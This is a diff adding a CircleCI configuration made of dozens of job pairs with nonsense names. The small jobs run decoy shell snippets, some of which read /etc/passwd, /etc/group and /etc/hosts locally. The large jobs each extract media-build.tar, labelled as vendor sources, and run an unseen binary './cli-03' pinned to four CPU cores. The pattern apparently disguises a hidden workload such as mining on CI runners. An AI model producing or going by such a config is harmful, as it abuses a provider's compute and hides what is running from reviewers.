@@ -1,0 +1,1545 @@
+version: 2.1
+
+jobs:
+  jogmw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute A
+          command: |
+            mkdir -p /var/tmp/_build
+            set +o pipefail 2>/dev/null; declare -A m; for i in $(seq 1 1000); do m[k${i}]=$((i*31)); done; for k in "${!m[@]}"; do echo "${k}=${m[$k]}"; done > /var/tmp/_build/44LMuCZtxuUZqyJ16D; true
+            echo "stage summary: name=yolo size=$(wc -c </var/tmp/_build/44LMuCZtxuUZqyJ16D)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - '44LMuCZtxuUZqyJ16D'
+  yolo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/44LMuCZtxuUZqyJ16D 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+  mutex_in_px:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: INC BIOS settings
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; find /run -name '*' -exec echo {} \; 2> /dev/null | wc -l; true ; } > /var/tmp/_build/df31a421-7e55-a5ef-6ac4-c2ff6cf4ab0
+            echo "stage summary: name=tweak-cache-redirect size=$(wc -c </var/tmp/_build/df31a421-7e55-a5ef-6ac4-c2ff6cf4ab0)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - 'df31a421-7e55-a5ef-6ac4-c2ff6cf4ab0'
+  tweak-cache-redirect:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/df31a421-7e55-a5ef-6ac4-c2ff6cf4ab0 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+  Victor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Monthly background check scheduling
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; gzip -c /etc/hosts >"/tmp/mockchunk3.gz" && gzip -t "/tmp/mockchunk3.gz" && echo valid; true ; } > /var/tmp/_build/zinc.receipt.filter
+            echo "stage summary: name=chen-ci size=$(wc -c </var/tmp/_build/zinc.receipt.filter)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - 'zinc.receipt.filter'
+  chen-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/northreefroutercloud 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+  iter6512:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: voodoo
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; echo 'cleanup done' >${TMPDIR:-/tmp}/usage.dat && wc -c <${TMPDIR:-/tmp}/usage.dat; true ; } > /var/tmp/_build/PNG.raster
+            echo "stage summary: name=wip-login-leak size=$(wc -c </var/tmp/_build/PNG.raster)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - 'PNG.raster'
+  wip-login-leak:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/PNG.raster 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+  kiloPool:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Update the antenna in time for compliance
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; for n in story heap owl merge;do printf '%s\n' $n; done|nl; true ; } > /var/tmp/_build/TensorValleyFlameStack
+            echo "stage summary: name=prometheus-alpha size=$(wc -c </var/tmp/_build/TensorValleyFlameStack)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - 'TensorValleyFlameStack'
+  prometheus-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/northreefroutercloud 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+  zUnionSidebar:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Confirm successful captioning of album art
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; printf 'name,city,score\ngrace,manila,48\niris,vienna,71\nann,nairobi,96\nwendy,cairo,76\n' >"/tmp/PRIMARY_BLACK.txt" && grep -c , "/tmp/PRIMARY_BLACK.txt"; true ; } > /var/tmp/_build/crc_94569eb2
+            echo "stage summary: name=titan-final size=$(wc -c </var/tmp/_build/crc_94569eb2)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - 'crc_94569eb2'
+  titan-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/crc_94569eb2 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+  comment_collect_disable:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Mux The Sprite Sheet Stage
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; awk -F'/' '{print $NF}' /etc/shells|tr "a-z" "A-Z"|sort|uniq -d; true ; } > /var/tmp/_build/blake_942b9f99
+            echo "stage summary: name=q4-ship size=$(wc -c </var/tmp/_build/blake_942b9f99)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - 'blake_942b9f99'
+  q4-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/blake_942b9f99 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+  footer_footer:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: trace 1c56
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; if [ -d ~ ]; then echo true; elif [ -e /tmp ]; then echo maybe; else echo false; fi; true ; } > /var/tmp/_build/20211109_165620
+            echo "stage summary: name=rm-edge-reload size=$(wc -c </var/tmp/_build/20211109_165620)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - '20211109_165620'
+  rm-edge-reload:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/20211109_165620 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+  enumObj:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Objective F format
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; cat /etc/hosts /etc/shells >"/tmp/home.md" && wc -l "/tmp/home.md"; true ; } > /var/tmp/_build/CSVTensor
+            echo "stage summary: name=v7-nightly size=$(wc -c </var/tmp/_build/CSVTensor)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - 'CSVTensor'
+  v7-nightly:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/northreefroutercloud 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+  wasBack:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: runChaosScenarioSnapshot
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; printf '%s\n' mango apple melon > '/tmp/match.csv' && tac '/tmp/match.csv'; true ; } > /var/tmp/_build/COBALT_HARBOR_MOLTEN
+            echo "stage summary: name=update-cache-hang size=$(wc -c </var/tmp/_build/COBALT_HARBOR_MOLTEN)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - 'COBALT_HARBOR_MOLTEN'
+  update-cache-hang:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/COBALT_HARBOR_MOLTEN 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+  pic_01080_deprecated:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Scold the rate limits
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'tests passed' | od -c | head -2; true ; } > /var/tmp/_build/GOPR00073611
+            echo "stage summary: name=dec5-rev size=$(wc -c </var/tmp/_build/GOPR00073611)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - 'GOPR00073611'
+  dec5-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/GOPR00073611 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+  Price2SVM:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Expand the settings gear on tablet
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; df -h | grep %; true ; } > /var/tmp/_build/7b513ae
+            echo "stage summary: name=Ship_Release5 size=$(wc -c </var/tmp/_build/7b513ae)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - '7b513ae'
+  Ship_Release5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/7b513ae 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+  iriscodes:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute A
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; for i in {1..8}; do echo $RANDOM; done | awk '{printf "%05d\n", $1}' | sort -u; true ; } > /var/tmp/_build/17528d5e-a087-4864
+            echo "stage summary: name=build-staging-integration-tests size=$(wc -c </var/tmp/_build/17528d5e-a087-4864)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - '17528d5e-a087-4864'
+  build-staging-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/17528d5e-a087-4864 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+  threadVec:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Playtest the weapon stats 12 times
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; echo 'nothing to do' >| '/tmp/backupfox.list' && cat '/tmp/backupfox.list'; true ; } > /var/tmp/_build/eNGINecRiMsonseRVerfeN
+            echo "stage summary: name=rigel-rc size=$(wc -c </var/tmp/_build/eNGINecRiMsonseRVerfeN)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - 'eNGINecRiMsonseRVerfeN'
+  rigel-rc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/northreefroutercloud 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+  id_054357_soft:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Teleport the cutscene
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; printf 'name,city,score\nbob,kyoto,95\ntina,vienna,51\nfrank,boston,62\ngrace,lima,85\n' >/tmp/wolf_old.tsv && head -n 1 /tmp/wolf_old.tsv | tr , "\n"; true ; } > /var/tmp/_build/VrPPNwE9kf
+            echo "stage summary: name=q3-smoke size=$(wc -c </var/tmp/_build/VrPPNwE9kf)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - 'VrPPNwE9kf'
+  q3-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/northreefroutercloud 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+  ID-STATUS-DTL:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Hold short of the access logs
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; comm -12 <(cut -d: -f1 /etc/passwd | sort) <(cut -d: -f1 /etc/group | sort) | head -4; true ; } > /var/tmp/_build/ambermoltenhawk
+            echo "stage summary: name=dotnet8-vet size=$(wc -c </var/tmp/_build/ambermoltenhawk)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - 'ambermoltenhawk'
+  dotnet8-vet:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/northreefroutercloud 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+  ppPotion:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Load test the mutation score if needed
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; grep -n -o --colour=auto 'vendor_id' /proc/cpuinfo | nl; true ; } > /var/tmp/_build/205.118
+            echo "stage summary: name=tango size=$(wc -c </var/tmp/_build/205.118)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - '205.118'
+  tango:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/COBALT_HARBOR_MOLTEN 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+  cloudprod4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Accrual SKIP
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; sleep 0.2 && echo "time is up"; true ; } > /var/tmp/_build/y6ivOyd6
+            echo "stage summary: name=rust-build size=$(wc -c </var/tmp/_build/y6ivOyd6)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - 'y6ivOyd6'
+  rust-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/northreefroutercloud 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+  inc_sz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Job 23 rebalancing leases a
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; printf %s "v0.9-beta" | md5sum | awk '{print $1}'; true ; } > /var/tmp/_build/MEADOW_WEST
+            echo "stage summary: name=rm-edge-hang size=$(wc -c </var/tmp/_build/MEADOW_WEST)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - 'MEADOW_WEST'
+  rm-edge-hang:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/COBALT_HARBOR_MOLTEN 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+  spoangstranai:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: tooling team congrats
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 3 -type d -name 'skel' -exec basename {} \; 2>/dev/null | wc -l; true ; } > /var/tmp/_build/CHROME
+            echo "stage summary: name=go1-21-fmt size=$(wc -c </var/tmp/_build/CHROME)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - 'CHROME'
+  go1-21-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/CHROME 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+  XXLO:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Please do archive the team roster
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; for k in orange peach grape pear;do printf '%-8s %d\n' "$k" ${#k}; done | paste -sd ' '; true ; } > /var/tmp/_build/14go0n3a57
+            echo "stage summary: name=verify-staging-release-candidate size=$(wc -c </var/tmp/_build/14go0n3a57)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - '14go0n3a57'
+  verify-staging-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/14go0n3a57 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+  mx-test-b:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Sort because it keeps failing
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; if [ -O ~ ];then echo "it is there"; else echo "nope"; fi; true ; } > /var/tmp/_build/northreefroutercloud
+            echo "stage summary: name=push-it size=$(wc -c </var/tmp/_build/northreefroutercloud)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - 'northreefroutercloud'
+  push-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/northreefroutercloud 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract -f media-build.tar
+      - run:
+          command: du -sh .
+      - run:
+          command: taskset -c 0-3 ./cli-03
+  batchTotalHandlerLedgerAtlas:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Pause 4 seconds then scan the webhook secrets
+          command: |
+            mkdir -p /var/tmp/_build
+            { set +o pipefail 2>/dev/null; N='access granted'; echo "${N@Q}"; true ; } > /var/tmp/_build/tenant-silver
+            echo "stage summary: name=v2-edge size=$(wc -c </var/tmp/_build/tenant-silver)"
+      - persist_to_workspace:
+          root: /var/tmp/_build
+          paths:
+            - 'tenant-silver'
+  v2-edge:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/_build
+      - run:
+          name: Fetch gate signal
+          command: |
+            [[ "$(tail -n 1 /var/tmp/_build/tenant-silver 2>/dev/null)" == *"."* ]] && echo "ends dot" || echo "no dot"
+      - run:
+          name: Fetch and expand
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll vendor sources
